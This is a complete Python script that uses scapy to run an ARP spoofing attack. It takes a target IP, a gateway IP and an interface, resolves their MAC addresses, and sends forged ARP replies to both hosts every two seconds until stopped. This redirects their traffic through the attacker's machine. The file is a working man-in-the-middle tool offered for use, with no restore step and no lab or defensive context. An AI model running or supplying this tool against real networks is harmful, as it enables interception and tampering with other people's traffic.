#!/usr/bin/env python3

import argparse
import time
import sys
from scapy.all import ARP, send, getmacbyip, get_if_hwaddr

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-g", "--gateway", required=True) 
    parser.add_argument("-i", "--interface", required=True)
    return parser.parse_args()

def get_mac_addr_by_ip(ip_address):
    try:
        mac = getmacbyip(ip_address)
        if mac is None:
            raise Exception(f"Could not resolve MAC for {ip_address}")
        return mac
    except Exception as e:
        print(f"[-] Error getting MAC for {ip_address}: {e}")
        sys.exit(1)

def spoof(target_ip, target_mac, gateway_ip, gateway_mac, attacker_mac, interface):
    packet_to_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                          psrc=gateway_ip, hwsrc=attacker_mac)
    packet_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                           psrc=target_ip, hwsrc=attacker_mac)
    
    send(packet_to_target, iface=interface, verbose=False)
    send(packet_to_gateway, iface=interface, verbose=False)

def main():
    args = get_arguments()
    
    print("[+] Starting ARP Spoofing attack")
    print(f"[+] Target: {args.target}")
    print(f"[+] Gateway: {args.gateway}")
    print(f"[+] Interface: {args.interface}")
    
    target_mac = get_mac_addr_by_ip(args.target)
    gateway_mac = get_mac_addr_by_ip(args.gateway)
    
    try:
        attacker_mac = get_if_hwaddr(args.interface)
    except:
        print(f"[-] Error getting MAC for interface {args.interface}")
        sys.exit(1)
    
    print(f"[+] Target MAC: {target_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")
    print(f"[+] Your MAC: {attacker_mac}")
    packets_sent = 0
    
    try:
        while True:
            spoof(args.target, target_mac, args.gateway, gateway_mac, attacker_mac, args.interface)
            packets_sent += 2
            print(f"\r[+] Packets sent: {packets_sent}", end="")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n[+] Stopped. Total packets: {packets_sent}")

if __name__ == "__main__" :
    main()